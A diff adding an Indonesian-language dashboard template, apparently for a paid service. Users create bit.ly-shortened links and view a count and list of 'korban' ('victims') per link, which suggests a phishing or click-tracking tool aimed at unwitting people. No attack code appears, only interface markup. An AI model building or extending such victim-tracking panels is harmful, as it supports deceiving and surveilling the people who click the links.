@@ -1,0 +1,109 @@
+@layout('layouts.app') 
+@set('title', 'Dashboard') 
+@section('content')
+<div class="mt-5">
+  <div class="grid grid-cols-3 gap-4 mb-5">
+    <div class="card w-100 bg-primary-focus shadow-xl">
+      <div class="card-body">
+        <h2 class="card-title">Expired</h2>
+        <p>{{ new Date(expired).toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }) }}</p>
+      </div>
+    </div>
+    <div class="card w-100 bg-success shadow-xl">
+      <div class="card-body">
+        <h2 class="card-title">VIP</h2>
+        <p>{{{ session.get("user").data.is_vip ? 'YES' : 'NO | Mau upgrade VIP? <a href="https://fb.me/xn7.go.id" target="_blank">Klik Disini</a>' }}}</p>
+      </div>
+    </div>
+    <div class="card w-100 bg-info shadow-xl">
+      <div class="card-body">
+        <h2 class="card-title">Your IP</h2>
+        <p>{{ request.ip() }}</p>
+      </div>
+    </div>
+  </div>
+  <div class="card w-full bg-base-300 shadow-xl align-middle">
+    <div class="card-body">
+      <h2 class="card-title">Link Yang Kamu Buat Ada Disini Kak!</h2>
+      <div class="card-actions">
+        <a class="btn btn-primary" href="/buat-link">Buat Link</a>
+      </div>
+      @if(flashMessages.has('error'))
+      <div class="alert alert-error shadow-lg">
+        <div>
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            class="stroke-current flex-shrink-0 h-6 w-6"
+            fill="none"
+            viewBox="0 0 24 24"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              stroke-width="2"
+              d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"
+            />
+          </svg>
+          <span>Error! {{flashMessages.get('error')}}.</span>
+        </div>
+        <div class="flex-none">
+          <button
+            class="btn btn-sm btn-primary-focus"
+            onclick="$('.alert').hide()"
+          >
+            OKE
+          </button>
+        </div>
+      </div>
+      @end
+      <div class="overflow-x-auto">
+        <table class="table w-full">
+          <!-- head -->
+          <thead>
+            <tr>
+              <th></th>
+              <th>Judul</th>
+              <th>Link</th>
+              <!-- <th>Redirect Ke</th> -->
+              <th>Korban</th>
+              <th>Aksi</th>
+            </tr>
+          </thead>
+          <tbody>
+            <!-- row 1 -->
+            @each(link in links)
+            <tr>
+              <th></th>
+              <th>{{ link.judul }}</th>
+              <td>
+                <div class="form-control">
+                  <div class="input-group">
+                    <input type="text" value="{{ 'https://bit.ly/' + link.kode }}" class="input input-bordered" readonly />
+                    <button class="btn btn-warning btn-square text-error">
+                      <svg xmlns="http://www.w3.org/2000/svg" class="text-danger" width="24" height="24" viewBox="0 0 24 24"><path d="M22 6v16h-16v-16h16zm2-2h-20v20h20v-20zm-24 17v-21h21v2h-19v19h-2z"/></svg>
+                    </button>
+                  </div>
+                </div>
+              </td>
+              <!-- <td>{{ link.url }}</td> -->
+              <td>{{ link.$extras.korban }}</td>
+              <td>
+                <a class="btn btn-warning" href="/link/edit/{{ link.id }}"
+                  >Edit</a
+                >
+                <a class="btn btn-danger" href="/link/delete/{{ link.id }}"
+                  >Hapus</a
+                >
+                <a class="btn btn-accent" href="/link/korban/{{ link.id }}"
+                  >Lihat Korban</a
+                >
+              </td>
+            </tr>
+            @endeach
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+@end
